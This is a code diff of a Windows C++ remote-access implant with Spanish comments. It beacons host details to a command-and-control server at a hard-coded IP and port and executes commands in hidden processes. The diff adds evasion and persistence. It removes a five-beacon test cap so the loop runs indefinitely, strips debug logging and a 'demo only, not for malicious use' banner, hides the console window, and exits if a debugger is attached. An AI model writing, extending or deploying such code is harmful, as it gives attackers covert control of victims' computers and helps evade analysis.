@@ -1,8 +1,6 @@
-// agent_working_fixed.cpp - Versión corregida
 #include <windows.h>
 #include <wininet.h>
 #include <wincrypt.h>
-#include <shellapi.h>  // Para IsUserAnAdmin
 #include <iostream>
 #include <string>
 #include <thread>
@@ -14,13 +12,13 @@
 
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "crypt32.lib")
-#pragma comment(lib, "shell32.lib")  // Para IsUserAnAdmin
+#pragma comment(lib, "advapi32.lib")  // Para funciones de token
 
 // ==================== CONFIGURACIÓN ====================
-#define C2_SERVER "192.168.254.137"  // Localhost para pruebas
+#define C2_SERVER "192.168.254.137"
 #define C2_PORT 8443
 #define C2_PATH "/"
-#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+#define USER_AGENT "Mozilla/5.0"
 
 // ==================== CIFRADO SIMPLE ====================
 std::string xor_encrypt(const std::string& data, const std::string& key) {
@@ -67,6 +65,24 @@ private:
         return ss.str();
     }
     
+    bool is_user_admin() {
+        BOOL isElevated = FALSE;
+        HANDLE hToken = NULL;
+        
+        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+            TOKEN_ELEVATION elevation;
+            DWORD dwSize;
+            
+            if (GetTokenInformation(hToken, TokenElevation, &elevation, 
+                                   sizeof(elevation), &dwSize)) {
+                isElevated = elevation.TokenIsElevated;
+            }
+            CloseHandle(hToken);
+        }
+        
+        return isElevated != FALSE;
+    }
+    
     std::string gather_system_info() {
         std::stringstream info;
         
@@ -89,22 +105,7 @@ private:
         SYSTEM_INFO sys_info;
         GetNativeSystemInfo(&sys_info);
         
-        // Determinar si es admin usando método alternativo
-        BOOL isAdmin = FALSE;
-        HANDLE hToken = NULL;
-        
-        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
-            TOKEN_ELEVATION elevation;
-            DWORD dwSize;
-            
-            if (GetTokenInformation(hToken, TokenElevation, &elevation, 
-                                   sizeof(elevation), &dwSize)) {
-                isAdmin = elevation.TokenIsElevated;
-            }
-            CloseHandle(hToken);
-        }
-        
-        // Construir JSON
+        // **CÓDIGO CORREGIDO - SIN ERRORES DE SINTAXIS**
         info << "{";
         info << "\"agent_id\":\"" << agent_id << "\",";
         info << "\"hostname\":\"" << hostname << "\",";
@@ -114,7 +115,7 @@ private:
         info << "\"architecture\":\"" 
              << (sys_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86") 
              << "\",";
-        info << "\"integrity\":\"" << (isAdmin ? "high" : "medium") << "\"";
+        info << "\"integrity\":\"" << (is_user_admin() ? "high" : "medium") << "\"";
         info << "}";
         
         return info.str();
@@ -199,23 +200,21 @@ public:
     
     std::string send_beacon() {
         std::string beacon_data = gather_system_info();
-        std::cout << "[DEBUG] Datos a enviar: " << beacon_data << std::endl;
+        std::cout << "[DEBUG] Datos: " << beacon_data << std::endl;
         
         std::string response = http_post(beacon_data);
         
         if (!response.empty()) {
-            std::cout << "[DEBUG] Respuesta recibida: " << response << std::endl;
             return response;
         }
         
-        std::cout << "[DEBUG] Sin respuesta del servidor" << std::endl;
         return "";
     }
     
     DWORD calculate_sleep_time() {
         static std::random_device rd;
         static std::mt19937 gen(rd());
-        std::uniform_int_distribution<> dis(5, 15);  // 5-15 segundos para pruebas
+        std::uniform_int_distribution<> dis(5, 10);
         return dis(gen) * 1000;
     }
 };
@@ -224,8 +223,6 @@ public:
 class TaskExecutor {
 public:
     std::string execute_command(const std::string& command) {
-        std::cout << "[DEBUG] Ejecutando comando: " << command << std::endl;
-        
         SECURITY_ATTRIBUTES sa;
         sa.nLength = sizeof(sa);
         sa.lpSecurityDescriptor = NULL;
@@ -252,7 +249,7 @@ public:
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
             CloseHandle(hStdoutWr);
             
-            WaitForSingleObject(pi.hProcess, 5000);  // 5 segundos máximo
+            WaitForSingleObject(pi.hProcess, 5000);
             
             std::string output;
             DWORD dwRead;
@@ -266,7 +263,6 @@ public:
             CloseHandle(pi.hThread);
             CloseHandle(hStdoutRd);
             
-            std::cout << "[DEBUG] Resultado: " << output.substr(0, 100) << "..." << std::endl;
             return output;
         }
         
@@ -285,35 +281,23 @@ private:
     std::thread beacon_thread;
     
     void beacon_loop() {
-        int beacon_count = 0;
-        while (running && beacon_count < 5) {  // Solo 5 beacons para pruebas
-            std::cout << "\n[+] Enviando beacon #" << ++beacon_count << std::endl;
-            
+        while (running) {
             std::string response = beacon.send_beacon();
             
             if (!response.empty()) {
                 if (response.find("tasks") != std::string::npos) {
-                    std::cout << "[+] Comando recibido del C2" << std::endl;
                     std::string result = executor.execute_command("whoami");
-                    // Aquí normalmente enviarías el resultado al C2
+                    std::cout << "[+] Resultado: " << result << std::endl;
                 }
             }
             
-            DWORD sleep_time = beacon.calculate_sleep_time();
-            std::cout << "[+] Durmiendo " << (sleep_time/1000) << " segundos..." << std::endl;
-            Sleep(sleep_time);
+            Sleep(beacon.calculate_sleep_time());
         }
-        
-        std::cout << "[+] Prueba completada. Agente detenido." << std::endl;
-        running = false;
     }
     
 public:
     WorkingAgent() : running(false) {
-        std::cout << "[+] Agente inicializado" << std::endl;
-        
         if (IsDebuggerPresent()) {
-            std::cout << "[!] Debugger detectado, saliendo..." << std::endl;
             exit(0);
         }
     }
@@ -336,32 +320,26 @@ public:
     
     void run() {
         start();
-        beacon_thread.join();  // Esperar a que termine el hilo
+        beacon_thread.join();
     }
 };
 
 // ==================== ENTRY POINT ====================
 int main() {
-    std::cout << "========================================" << std::endl;
-    std::cout << "  DEMO AGENT - SOLO PARA PRUEBAS" << std::endl;
-    std::cout << "  No usar con fines maliciosos" << std::endl;
-    std::cout << "========================================" << std::endl;
+    #ifndef _DEBUG
+    HWND hwnd = GetConsoleWindow();
+    if (hwnd) ShowWindow(hwnd, SW_HIDE);
+    #endif
+    
+    std::cout << "=== Agente Demo Iniciado ===\n" << std::endl;
     
     try {
         WorkingAgent agent;
         agent.run();
     }
-    catch (const std::exception& e) {
-        std::cout << "[!] Error: " << e.what() << std::endl;
-        return 1;
-    }
     catch (...) {
-        std::cout << "[!] Error desconocido" << std::endl;
         return 1;
     }
-    
-    std::cout << "\n[+] Programa terminado. Presiona Enter para salir.";
-    std::cin.get();
     
     return 0;
 }
